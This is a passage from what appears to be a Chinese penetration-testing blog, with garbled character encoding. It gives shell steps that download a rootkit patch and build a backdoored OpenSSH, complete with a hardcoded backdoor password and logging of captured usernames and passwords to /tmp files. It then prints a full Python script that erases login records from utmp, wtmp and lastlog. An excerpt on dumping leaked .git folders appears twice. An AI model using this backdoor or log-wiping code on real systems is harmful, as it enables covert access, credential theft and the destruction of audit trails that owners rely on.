<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  åé—¨
æ‰§è¡Œvi includes.h

+<span class="token comment">#define ILOG "/tmp/ilog" //è®°å½•ç™»å½•åˆ°æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span>
+<span class="token comment">#define OLOG "/tmp/olog" //è®°å½•æœ¬æœºç™»å½•åˆ°è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span>
+<span class="token comment">#define SECRETPW "123456654321" //ä½ åé—¨çš„å¯†ç </span>

æ‰§è¡Œvi version.h

<span class="token comment">#define SSH_VERSION "å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬"</span>
<span class="token comment">#define SSH_PORTABLE "å°ç‰ˆæœ¬å·"</span>
./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
<span class="token function">service</span> sshd restart //é‡å¯sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
<p>æ¥ä¸‹æ¥åˆ é™¤ç™»å½•çš„å†å²è®°å½•ï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>ä»£ç å¤åˆ¶è¿‡æ¥ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
 
UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
 
LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
 
XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
    xtmp <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
 
            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> xtmp
 
 
<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
 
    timestamp <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
 
    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
 
 
<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> msg
    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
 
            <span class="token comment"># tamper</span>
            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
 
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>====<br>æ›´æ–°ï¼š</p>
<p>ä¸Šé¢çš„å¯ä»¥åœ¨debainç³»ä½¿ç”¨ï¼Œæ„Ÿè§‰ä¸‹é¢è¿™ç§æ–¹æ³•æ›´é€šç”¨ï¼š<br>æœ‰ä¸¤ç§æ–¹å¼:</p>
<ol>
<li>ä¿®æ”¹<code>/etc/ssh/ssh_config</code>æˆ–è€… <code>~/.ssh/config</code> é…ç½®æ–‡ä»¶:</li>
</ol>
<p>Host *</p>
	
	</div>
  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/03/30/git-folder-exploit.html" >Git folder exploit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-03-30  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
</ul>
<p>å½“éƒ¨ç½²çº¿ä¸Šé¡¹ç›®çš„æ—¶å€™å¯èƒ½ä¼šæŠŠgitä»£ç ä»“åº“ä¸€èµ·éƒ¨ç½²ä¸Šå»ï¼Œé€ æˆçš„ç»“æœå°±æ˜¯<code>.git</code>æ–‡ä»¶å¤¹æ³„æ¼ï¼Œç”±æ­¤å¯ä»¥æ ¹æ®<code>.git/index</code>æ¥çŸ¥é“å¯¹åº”çš„å‹ç¼©æ–‡ä»¶åå­—ï¼Œä¸‹è½½ä¹‹åè§£å‹ç¼©å³å¯å¾—åˆ°æºä»£ç ã€‚è¿™ä¸ªç¨‹åºæ˜¯æ ¹æ®lijiejieçš„<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>æ›´æ”¹è¿‡æ¥çš„ã€‚</p>
<p>å› ä¸º<code>githack</code>ä½¿ç”¨çš„æ˜¯socketç›´æ¥read(ï¼‰ä¹‹åè§£å‹ç¼©ï¼Œå¦‚æœæ–‡ä»¶å¤ªå¤§ä¼šé€ æˆå¡æ­»ã€‚ä¸ç®¡æ˜¯<code>githack</code>è¿˜æ˜¯<code>rip-git</code>ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè€Œä¸”æœåŠ¡å™¨è®¾ç½®äº†302è·³è½¬çš„è¯ï¼Œå°±ä¼šä¸‹è½½è·³è½¬é‚£ä¸ªé¡µé¢ï¼Œæœ€åä¼šå¯¼è‡´ä¸‹è½½å¥½å¤šé‡å¤æ–‡ä»¶ã€‚</p>
<p>æ‰€ä»¥æˆ‘åœ¨æºä»£ç çš„åŸºç¡€ä¸Šæ›´æ”¹äº†ä¸‹ï¼Œå…ˆä¸‹è½½gitå‹ç¼©æ–‡ä»¶ï¼Œç„¶åå†è§£å‹ç¼©åˆ°å¯¹åº”çš„åç§°ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒæœåŠ¡å™¨è·³è½¬ï¼Œå°±passã€‚ä¸­é—´ç¢°åˆ°å‡ ä¸ªé—®é¢˜å¦‚ä¸‹ï¼š</p>
<h2 id="ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜"><a href="#ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜" class="headerlink" title="ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜"></a>ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">å®˜æ–¹æ–‡æ¡£</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
</ul>
<p> ç®€å•æ¥è¯´ï¼Œ<code>Timeouts</code>å¯ä»¥æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œç¬¬ä¸€ä¸ªæ•°å€¼ä»£è¡¨çš„æ˜¯<code>connect</code>çš„<code>timeout</code>ï¼Œç¬¬äºŒä¸ªæ•°å€¼è¡¨ç¤º<code>read</code>çš„<code>timeout</code>ï¼Œåœ¨è¿™é‡Œ<code>read</code>çš„<code>timeout</code>è¡¨ç¤ºçš„æ˜¯<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, itâ€™s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
<h4 id="ä¸‹è½½å¤§æ–‡ä»¶"><a href="#ä¸‹è½½å¤§æ–‡ä»¶" class="headerlink" title="ä¸‹è½½å¤§æ–‡ä»¶"></a>ä¸‹è½½å¤§æ–‡ä»¶</h4><p>ä½¿ç”¨requestsï¼Œæ‰€ä»¥ä¸‹è½½çš„æ—¶å€™ä¸éœ€è¦æ‹…å¿ƒsteam=Trueçš„æƒ…å†µï¼Œç›´æ¥ä½¿ç”¨ã€‚</p>
	

	</div>
  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
</ul>
<p>å½“éƒ¨ç½²çº¿ä¸Šé¡¹ç›®çš„æ—¶å€™å¯èƒ½ä¼šæŠŠgitä»£ç ä»“åº“ä¸€èµ·éƒ¨ç½²ä¸Šå»ï¼Œé€ æˆçš„ç»“æœå°±æ˜¯<code>.git</code>æ–‡ä»¶å¤¹æ³„æ¼ï¼Œç”±æ­¤å¯ä»¥æ ¹æ®<code>.git/index</code>æ¥çŸ¥é“å¯¹åº”çš„å‹ç¼©æ–‡ä»¶åå­—ï¼Œä¸‹è½½ä¹‹åè§£å‹ç¼©å³å¯å¾—åˆ°æºä»£ç ã€‚è¿™ä¸ªç¨‹åºæ˜¯æ ¹æ®lijiejieçš„<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>æ›´æ”¹è¿‡æ¥çš„ã€‚</p>
<p>å› ä¸º<code>githack</code>ä½¿ç”¨çš„æ˜¯socketç›´æ¥read(ï¼‰ä¹‹åè§£å‹ç¼©ï¼Œå¦‚æœæ–‡ä»¶å¤ªå¤§ä¼šé€ æˆå¡æ­»ã€‚ä¸ç®¡æ˜¯<code>githack</code>è¿˜æ˜¯<code>rip-git</code>ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè€Œä¸”æœåŠ¡å™¨è®¾ç½®äº†302è·³è½¬çš„è¯ï¼Œå°±ä¼šä¸‹è½½è·³è½¬é‚£ä¸ªé¡µé¢ï¼Œæœ€åä¼šå¯¼è‡´ä¸‹è½½å¥½å¤šé‡å¤æ–‡ä»¶ã€‚</p>
<p>æ‰€ä»¥æˆ‘åœ¨æºä»£ç çš„åŸºç¡€ä¸Šæ›´æ”¹äº†ä¸‹ï¼Œå…ˆä¸‹è½½gitå‹ç¼©æ–‡ä»¶ï¼Œç„¶åå†è§£å‹ç¼©åˆ°å¯¹åº”çš„åç§°ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒæœåŠ¡å™¨è·³è½¬ï¼Œå°±passã€‚ä¸­é—´ç¢°åˆ°å‡ ä¸ªé—®é¢˜å¦‚ä¸‹ï¼š</p>
<h2 id="ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜"><a href="#ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜" class="headerlink" title="ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜"></a>ä½¿ç”¨requestsç¢°åˆ°çš„é—®é¢˜</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">å®˜æ–¹æ–‡æ¡£</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
</ul>
<p> ç®€å•æ¥è¯´ï¼Œ<code>Timeouts</code>å¯ä»¥æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œç¬¬ä¸€ä¸ªæ•°å€¼ä»£è¡¨çš„æ˜¯<code>connect</code>çš„<code>timeout</code>ï¼Œç¬¬äºŒä¸ªæ•°å€¼è¡¨ç¤º<code>read</code>çš„<code>timeout</code>ï¼Œåœ¨è¿™é‡Œ<code>read</code>çš„<code>timeout</code>è¡¨ç¤ºçš„æ˜¯<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, itâ€™s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
<h4 id="ä¸‹è½½å¤§æ–‡ä»¶"><a href="#ä¸‹è½½å¤§æ–‡ä»¶" class="headerlink" title="ä¸‹è½½å¤§æ–‡ä»¶"></a>ä¸‹è½½å¤§æ–‡ä»¶</h4><p>ä½¿ç”¨requestsï¼Œæ‰€ä»¥ä¸‹è½½çš„æ—¶å€™ä¸éœ€è¦æ‹…å¿ƒsteam=Trueçš„æƒ…å†µï¼Œç›´æ¥ä½¿ç”¨ã€‚</p>
	
	</div>
  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
		
			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
		
			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
		
			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
		
			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
		
			<li><a href="/categories/Python/">Python<span>5</span></a></li>
		
			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
		
			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
		
		</ul>
	</div>

		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</a>
      </li>
    
      <li>
        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
      </li>
    
      <li>
        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silverè°ƒæŸ¥æŠ¥å‘Š</a>
      </li>
    
      <li>
        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuatoræ¼æ´å¤ç°</a>
      </li>
    
      <li>
